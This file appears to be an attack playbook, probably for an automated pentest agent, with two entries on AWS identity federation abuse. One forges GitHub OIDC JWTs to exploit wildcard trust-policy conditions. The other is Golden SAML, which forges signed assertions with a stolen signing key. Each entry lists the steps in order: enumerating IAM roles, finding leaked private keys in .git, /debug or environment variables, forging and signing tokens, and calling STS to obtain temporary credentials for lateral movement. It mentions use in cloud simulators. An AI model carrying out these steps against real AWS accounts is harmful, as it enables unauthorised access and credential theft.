title: AWS OIDC Federation Claim Mismatch — Cross-Repo AssumeRoleWithWebIdentity
description: AWS IAM OIDC identity providers use trust policies with StringLike/StringEquals conditions on JWT claims (sub, aud). When the trust policy uses wildcards in claim conditions (e.g., token.actions.githubusercontent.com:sub with repo:demo-org/*), the condition matches tokens from unauthorized repositories. Attack: (1) Discover OIDC provider ARN: aws iam list-open-id-connect-providers. (2) List roles using the provider: aws iam list-roles — check trust policies of each role with aws iam get-role --role-name ROLE. (3) Identify StringLike conditions with wildcards (repo:* or repo:ANY_ORG/*). (4) Forge JWT with matching claims using jwt_forge: sub=repo:ANY_ORG/ANY_REPO:ref:refs/heads/main, aud=sts.amazonaws.com. (5) Call STS: aws sts assume-role-with-web-identity --role-arn ROLE_ARN --role-session-name test --web-identity-token "$JWT". (6) Use returned temporary credentials (AccessKeyId, SecretAccessKey, SessionToken) for lateral movement to AWS services.
techniques: List OIDC providers: aws iam list-open-id-connect-providers
Get role trust policy: aws iam get-role --role-name ROLE --query 'Role.AssumeRolePolicyDocument'
Identify wildcard conditions: StringLike with repo:* or sub=*
Forge JWT: jwt_forge with sub=repo:ANY/ANY:ref:refs/heads/main, aud=sts.amazonaws.com
Assume role: aws sts assume-role-with-web-identity --role-arn ROLE_ARN --role-session-name attacker --web-identity-token TOKEN
indicators: Trust policy with StringLike condition on sub or aud claim
Wildcard in sub condition allowing cross-repo/cross-org access
jwt_forge can create tokens with arbitrary sub claims
prerequisites: AWS CLI with IAM read permissions (iam:ListRoles, iam:GetRole)
Knowledge of OIDC provider audience and thumbprint

title: Golden SAML — SAML Assertion Forging with Compromised Token-Signing Key
description: When the SAML identity provider's token-signing private key is compromised, an attacker can forge SAML 2.0 assertions to assume any IAM role. Attack: (1) Obtain the SAML token-signing private key (typically a PEM file leaked via .git/config, metadata service, or environment variable). (2) Construct a SAML 2.0 assertion XML document with: Issuer (IdP entity ID), Subject/NameID, Conditions (NotBefore/NotOnOrAfter timestamps), AttributeStatement containing AWS role attributes (https://aws.amazon.com/SAML/Attributes/Role with ROLE_ARN,PROVIDER_ARN and https://aws.amazon.com/SAML/Attributes/RoleSessionName). (3) Sign the assertion using XMLDSig (xmlsec1 CLI or Python signxml library) with the compromised private key. (4) Base64-encode the signed assertion. (5) Call STS: aws sts assume-role-with-saml --role-arn ROLE_ARN --principal-arn PROVIDER_ARN --saml-assertion "$BASE64_ASSERTION". (6) Use returned temporary credentials. NOTE: In simulated/local cloud environments, the IdP/STS may use JWT-based federation instead of full SAML XMLDSig. If the IdP endpoint returns a JWT or the STS accepts JWT tokens, use jwt_forge with RS256 algorithm and the private key directly — no SAML XML construction or xmlsec1 needed.
techniques: Obtain signing key: look for .pem files, env vars (SAML_SIGNING_KEY, PRIVATE_KEY), or metadata endpoints like /backup, /debug, /.git
Construct SAML XML with proper namespaces (urn:oasis:names:tc:SAML:2.0:assertion)
Include AWS role attributes: AttributeStatement with Role and RoleSessionName
Sign with xmlsec1: xmlsec1 --sign --privkey-pem key.pem --output signed.xml assertion.xml
Sign with Python: from signxml import XMLSigner; signer = XMLSigner().sign(assertion_xml, key=private_key, cert=cert)
Assume role: aws sts assume-role-with-saml --role-arn ROLE_ARN --principal-arn PROVIDER_ARN --saml-assertion "$B64"
JWT path (cloud simulators): if IdP returns JWT, use jwt_forge with algorithm=RS256 and the PEM as secret — then aws sts assume-role-with-web-identity or the simulator's assume-role endpoint
indicators: Private key leakage (PEM in source code, metadata, or env vars)
Python signxml or system xmlsec1 available
Cloud simulator: IdP /debug or /backup endpoint exposes key
IdP returns JWT instead of SAML XML (indicates JWT-based federation)
prerequisites: SAML IdP token-signing private key (PEM format)
SAML provider ARN and role ARN
IAM role trust policy allowing SAML federation (saml:aud condition)
For full SAML: xmlsec1 CLI or Python signxml package; for JWT-based simulators: jwt_forge with RS256
